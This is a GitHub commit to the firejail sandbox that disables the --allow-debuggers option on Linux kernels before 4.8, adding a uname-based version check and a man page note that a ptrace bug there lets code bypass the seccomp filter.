| Expand Down | |  |

19 changes: 19 additions & 0 deletions

19
[src/firejail/main.c](#diff-6698244f9a67e5c8ae5c03806df74f6d9f1ae1b31ad6176eb09e136f07f3dad9 "src/firejail/main.c")

Show comments

[View file](/netblue30/firejail/blob/6b8dba29d73257311564ee7f27b9b14758cc693e/src/firejail/main.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -35,6 +35,7 @@ |
|  |  | #include <signal.h> |
|  |  | #include <time.h> |
|  |  | #include <net/if.h> |
|  |  | #include <sys/utsname.h> |
|  |  |  |
|  |  | #if 0 |
|  |  | #include <sys/times.h> |
| Expand Down  Expand Up | | @@ -802,6 +803,24 @@ static void detect\_allow\_debuggers(int argc, char \*\*argv) { |
|  |  | // detect --allow-debuggers |
|  |  | for (i = 1; i < argc; i++) { |
|  |  | if (strcmp(argv[i], "--allow-debuggers") == 0) { |
|  |  | // check kernel version |
|  |  | struct utsname u; |
|  |  | int rv = uname(&u); |
|  |  | if (rv != 0) |
|  |  | errExit("uname"); |
|  |  | int major; |
|  |  | int minor; |
|  |  | if (2 != sscanf(u.release, "%d.%d", &major, &minor)) { |
|  |  | fprintf(stderr, "Error: cannot extract Linux kernel version: %s\n", u.version); |
|  |  | exit(1); |
|  |  | } |
|  |  | if (major < 4 || (major == 4 && minor < 8)) { |
|  |  | fprintf(stderr, "Error: --allow-debuggers is disabled on Linux kernels prior to 4.8. " |
|  |  | "A bug in ptrace call allows a full bypass of the seccomp filter. " |
|  |  | "Your current kernel version is %d.%d.\n", major, minor); |
|  |  | exit(1); |
|  |  | } |
|  |  |  |
|  |  | arg\_allow\_debuggers = 1; |
|  |  | break; |
|  |  | } |
| Expand Down | |  |

4 changes: 3 additions & 1 deletion

4
[src/man/firejail.txt](#diff-97f7f95889f9d4cdd046fd44b8a0d4b0325d79ef80365ecd6c938dbcf729dc64 "src/man/firejail.txt")

Show comments

[View file](/netblue30/firejail/blob/6b8dba29d73257311564ee7f27b9b14758cc693e/src/man/firejail.txt)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

| Expand Up | | @@ -76,7 +76,9 @@ $ firejail [OPTIONS] firefox # starting Mozilla Firefox |
|  |  | Signal the end of options and disables further option processing. |
|  |  | .TP |
|  |  | \fB\-\-allow-debuggers |
|  |  | Allow tools such as strace and gdb inside the sandbox. |
|  |  | Allow tools such as strace and gdb inside the sandbox. This option is only available |
|  |  | when running on Linux kernels 4.8 or newer - a kernel bug in ptrace system call allows a full |
|  |  | bypass of the seccomp filter. |
|  |  | .br |
|  |  |  |
|  |  | .br |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `6b8dba2`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fnetblue30%2Ffirejail%2Fcommit%2F6b8dba29d73257311564ee7f27b9b14758cc693e) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


